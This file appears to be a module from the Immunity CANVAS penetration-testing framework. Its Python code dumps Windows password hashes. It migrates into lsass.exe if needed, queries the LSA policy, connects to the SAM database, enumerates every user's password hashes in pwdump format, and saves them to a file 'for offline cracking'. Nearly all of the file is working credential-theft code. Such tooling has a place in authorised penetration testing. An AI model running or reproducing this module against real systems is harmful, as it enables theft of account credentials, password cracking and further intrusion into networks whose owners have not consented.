#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2018
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os
from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand
from win32MosdefShellServer import *

NAME                   = "getpasswordhashes"
DESCRIPTION            = "Get user password hashes for offline cracking"
DOCUMENTATION          = {}
DOCUMENTATION["Notes"] = """

You need to be in LSASS.EXE before running this.
This means you might need to getpriv SeDebugPrivilege, and then
use processinject into lsass.exe. The module will attempt to automatically
do this if it is not already in LSASS.EXE.

Don't forget you can ps and getpid if you don't know what process you're
in right now.

"""
VERSION                = "1.0" #QO44056 fixes this?
GTK2_DIALOG            = "dialog.glade2"

PROPERTY               = {}
PROPERTY['TYPE']       = "Commands"
PROPERTY['SITE']       = "Local"
PROPERTY['ARCH']       = [ ["Windows"] ]

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result     = ""
        self.name       = NAME
        self.systemname = "\\\\127.0.0.1"
        self.savefile   = "passwordhashes.txt"

    # set progress bar
    def set_progr(self, msg, percent):
        self.setInfo("getpasswdhashes - " + msg)
        self.setProgress(percent)

    def getargs(self):
        #need to revise to use get_knowledge/set_knowledge
        # self.systemname = self.argsDict.get("systemname", self.systemname)
        self.savefile = self.argsDict.get("savefile", self.savefile)

    def run(self):
        self.setInfo("%s" % NAME)
        self.getargs()

        node = self.argsDict["passednodes"][0]
        self.host = self.target.interface
        self.savepath = self.output(ip=node.get_interesting_interface(), subdir="PasswordHashes")

        if "win32api" in node.capabilities:
            # self.log('Using system name: %s' % self.systemname)
            shell = node.shell

            #JMS - slight logic refactor, we need to do our lsass.exe check
            #first or we won't get a valid connection from SamIConnect
            self.log("Testing whether we are inside lsass.exe.")
            pname = self.exploitnodes("getprocessname", nodes=[node])
            self.log("Process Name: %s" % pname)

            if "lsass" not in pname[0][0].lower():
                self.log("We need to processinject into lsass.exe to run this module. Attempting now...")

                # Just do a default mosdefmigrate and be done with it
                migrate = self.engine.getModuleExploit( "mosdefmigrate" )
                migrate.link(self)
                ret = migrate.run()

                if not ret:
                    self.log("Couldn't migrate, time to call it off.")
                    self.result = -1
                    return self.result
                else:
                    shell = node.shell

            self.set_progr("Opening lsa policy", 10.0)
            ret, policy = shell.LsaOpenPolicy(self.systemname, POLICY_VIEW_LOCAL_INFORMATION)

            if ret == 0:
                self.log("Could not open LSA Policy. Errno=0x%8.8x!" % uint32(policy))
                if uint32(policy) == uint32(0xc002001b):
                    self.log("Someone else has the View Local Information Policy open already!")
                return 0

            self.log("LsaOpenPolicy passed. Policy: %x" % policy)
            self.set_progr("Getting policy info", 30.0)
            ret, domaininfo = shell.LsaQueryInformationPolicy(policy, "PolicyAccountDomainInformation")

            if ret == 0:
                self.log("Could not do LsaQueryInformationPolicy with errcode=0x%8.8x" % uint32(domaininfo))
                return 0

            domainName, sid = domaininfo
            self.log('domainName: %s, sid: 0x%x' % (domainName, sid))


            self.log("LsaQueryInformationPolicy Succeeded")
            self.log("Closing Policy")
            self.set_progr("Closing policy", 40.0)
            self.log('LsaClose: %s' % shell.LsaClose(policy))
            self.log("Policy Closed")

            self.set_progr("Sam connecting...", 50.0)
            ret, hSam = shell.SamIConnect(MAXIMUM_ALLOWED)

            if ret == 0:
                self.log("We couldn't connect to the SAM database. Error: 0x%08x" % int(hSam))
                self.result = -1
                return self.result

            self.log("SamIConnect succeeded hSam = 0x%x" % hSam)

            self.set_progr("Opening SAM domain", 60.0)
            ret, domain = shell.SamrOpenDomain(hSam, sid)

            if ret == 0:
                self.log("Could not do SamrOpenDomain Errno=0x%8.8x!" % uint32(domain))
                return 0

            self.log("Done SamrOpenDomain(0x%x), doing Enumerate Users" % domain)
            self.set_progr("Enumarating users", 80.0)
            ret, users = shell.SamrEnumerateUsersInDomain(domain)

            #these should both be zero (NT_SUCCESS)
            # SamrCloseHandle wants a PHANDLE arg .. not a HANDLE .. so &handle should be the arg in the MOSDEF C afaik
            self.set_progr("Closing SAM handles", 90.0)
            s_ret = shell.SamrCloseHandle(domain)
            self.log("SamrCloseHandle(domain) returned %x" % uint32(s_ret))

            s_ret = shell.SamrCloseHandle(hSam)
            self.log("SamrCloseHandle(hSam) returned %x" % uint32(s_ret))
            self.log("SamrEnumerateUsersInDomain returned %d" % ret)

            if ret:
                #success!
                user_list = ""
                for user in users:
                    user_entry = "%s:%s:%s:%s:::\n" % (prettyprint(user[0]),
                                                       prettyprint(user[1]),
                                                       cleanhexprint(user[2]),
                                                       cleanhexprint(user[3]))
                    self.log(user_entry)
                    user_list += user_entry

                #get the computer name for better reporting!
                computername = node.shell.getComputerName()
                tnode        = self.argsDict["passednodes"][0]
                self.remote_ip = tnode.get_interesting_interface()

                self.new_event("passwords", {
                        "remote_ip"    : self.remote_ip,
                        "os"           : "Windows",
                        "hashes"       : users,
                        "node"         : str(node),
                        "computername" : computername,
                    })

                # Log it to the file
                save_loc = os.path.join(self.savepath, self.savefile)
                fd = open(save_loc,"a")
                fd.write(user_list)
                fd.close()

                self.log("Saved password hashes to: %s" % save_loc)

            self.result=users
        else:
            self.log("%s node type not supported" % node.nodetype)

        self.setInfo("%s - done (success: %s)" % (NAME, self.result))
        return 1

if __name__ == "__main__":
    print "This is an exploit that should be used only from within CANVAS"
